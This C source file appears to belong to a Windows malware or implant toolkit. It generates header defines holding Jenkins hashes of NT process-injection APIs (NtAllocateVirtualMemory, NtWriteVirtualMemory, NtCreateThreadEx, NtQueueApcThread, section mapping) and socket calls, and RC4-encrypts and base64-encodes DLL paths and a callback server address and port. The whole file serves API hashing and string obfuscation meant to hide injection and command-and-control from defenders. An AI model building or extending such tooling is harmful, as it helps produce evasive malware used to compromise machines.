#pragma comment(lib, "Crypt32.lib")

#include <Windows.h>
#include <stdio.h>
#include <wincrypt.h>
#include "Definitions.h"
#include "crypto/Crypto.h"
#include "memoryCollector/MemoryCollector.h"

PCSTR hDefinitionsA[] = 
{
    "HASH_CONNECT_FUNCTION",
    "HASH_SEND_FUNCTION",
    "HASH_RECV_FUNCTION", 
    "HASH_GETMODULEHANDLE_FUNCTION",
    "HASH_NTALLOCATEVIRTUALMEMORY_FUNCTION",
    "HASH_NTPROTECTVIRTUALMEMORY_FUNCTION",
    "HASH_NTWRITEVIRTUALMEMORY_FUNCTION",
    "HASH_NTCREATETHREAD_FUNCTION",
    "HASH_NTAPCQUEUETASK_FUNCTION",
    "HASH_NTCREATESECTION_FUNCTION",
    "HASH_MAPVIEWOFSECTION_FUNCTION",
    "HASH_NTCLOSE_FUNCTION",
    "HASH_UNMAPVIEWOFSECTION_FUNCTION"
};
PCSTR hDefinitionsValuesA[] = 
{    
    "connect",
    "send",
    "recv",
    "GetModuleHandleA",
    "NtAllocateVirtualMemory",
    "NtProtectVirtualMemory",
    "NtWriteVirtualMemory",
    "NtCreateThreadEx",
    "NtQueueApcThread",
    "NtCreateSection",
    "NtMapViewOfSection",
    "NtClose",
    "NtUnmapViewOfSection"
};

PCWSTR hDefinitionsW[] = {L"HASH_KERNERL32DLL_ROUTE"};
PCWSTR hDefinitionsValuesW[] = {L"c:\\windows\\system32\\kernel32.dll"};

PCSTR cryptDefinitions[] = {
    "CRYPT_WS2_32_DLL_ROUTE",
    "CRYPT_NTDLL_DLL_ROUTE",
    "CRYPT_SERVER_DOMAIN",
    "CRYPT_PORT_SERVER"};
PCSTR cryptDefinitionsValues[] = {
    "C:\\Windows\\System32\\ws2_32.dll",
    "C:\\Windows\\System32\\ntdll.dll",
    "192.168.1.55",
    "8888"};

int main()
{
    printf("#define HASH_MODE_JENKINS\n");
    for(int i = 0; i < sizeof(hDefinitionsA)/sizeof(PCSTR); i++)
    {
        printf("#define %s\t%lu\n",hDefinitionsA[i],hashAscii(hDefinitionsValuesA[i]));
    }

    for(int i = 0; i < sizeof(hDefinitionsW)/sizeof(PCWSTR); i++)
    {
        printf("#define %ls\t%lu\n",hDefinitionsW[i],hashWide(hDefinitionsValuesW[i]));
    }

    printf("\n\n#define CHIPER_MODE_RC4\n");
    for(int i = 0; i < sizeof(cryptDefinitions)/sizeof(PCSTR); i++)
    {
        DWORD sizeToAlloc = 0;
        DWORD sizeofchiper = strlen(cryptDefinitionsValues[i]);
        LPSTR cryptAux = (LPSTR)allocMemory(sizeofchiper + 1);
        memcpy(cryptAux, cryptDefinitionsValues[i], sizeofchiper);
        cryptAux[sizeofchiper] = '\0';
        PBYTE chiper = encrypt(cryptAux, strlen(cryptAux));
        CryptBinaryToString(chiper, sizeofchiper, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &sizeToAlloc);
        LPSTR base64 = (LPSTR)allocMemory(sizeToAlloc);
        CryptBinaryToString(chiper, sizeofchiper, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64, &sizeToAlloc);
        printf("#define %s\t\"%s\"\n",cryptDefinitions[i],base64);
        freeMemory(base64);
    }

}